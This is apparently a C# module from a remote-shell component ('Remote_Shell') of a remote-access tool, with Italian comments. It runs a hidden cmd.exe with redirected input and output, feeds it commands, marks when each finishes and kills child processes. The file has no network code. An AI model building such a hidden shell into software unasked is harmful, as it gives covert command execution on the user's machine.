using System;
using System.Diagnostics;

namespace bc.srv.Muduli.Remote_Shell
{
    internal class ShellWorker
    {
        private Process process;
        public string SCmdComplete = "BC_Shell_End"; // QUESTA LINEA MI INDICA CHE IL COMANDO è STATO CONCLUSO
        public event DataReceivedEventHandler StdOut;
        public event DataReceivedEventHandler StdError;

        /// <summary>
        ///     Inizializzazione
        /// </summary>
        public bool Initialize()
        {
            try
            {
                if (StdOut == null && StdError == null)
                    return false;

                string comspec;
                try
                {
                    comspec = Environment.GetEnvironmentVariable("comspec");
                }
                catch
                {
                    return false;
                }

                if (string.IsNullOrEmpty(comspec))
                    return false;

                process = new Process
                {
                    StartInfo =
                    {
                        FileName = comspec,
                        RedirectStandardInput = true,
                        RedirectStandardOutput = true,
                        RedirectStandardError = true,
                        CreateNoWindow = true,
                        UseShellExecute = false
                    },
                    EnableRaisingEvents = true
                };

                process.ErrorDataReceived += StdError;
                process.OutputDataReceived += StdOut;
                process.Start();

                if (StdError != null)
                    process.BeginErrorReadLine();

                if (StdOut != null)
                    process.BeginOutputReadLine();

                return true;
            }
            catch
            {
                return false;
            }
        }
        //-------------

        /// <summary>
        ///     Esegue il comando
        /// </summary>
        /// <param name="command">The command.</param>
        public void Execute(string command)
        {
            try
            {
                if (process == null || StdOut == null && StdError == null || process.HasExited)
                {
                    if (process != null)
                        Terminate();

                    Initialize();
                }

                if (process != null)
                {
                    process.StandardInput.WriteLine(command);
                    process.StandardInput.WriteLine(""); // chiedo localizzazione
                    process.StandardInput.WriteLine("@echo " + SCmdComplete); // fine comandi
                }
            }
            catch
            {
            }
        }

        /// <summary>
        ///     termina processi
        /// </summary>
        public void Terminate()
        {
            try
            {
                if (process == null || process.HasExited)
                    return;

                var processes = Process.GetProcesses();
                foreach (var process in processes)
                    try
                    {
                        var pfc = new PerformanceCounter("Process", "Creating Process Id", process.ProcessName);
                        if ((int) pfc.RawValue == this.process.Id)
                            process.Kill();
                    }
                    catch
                    {
                    }

                process.Kill();
                process.Close();
                process = null;
            }
            catch
            {
            }
        }
    }
}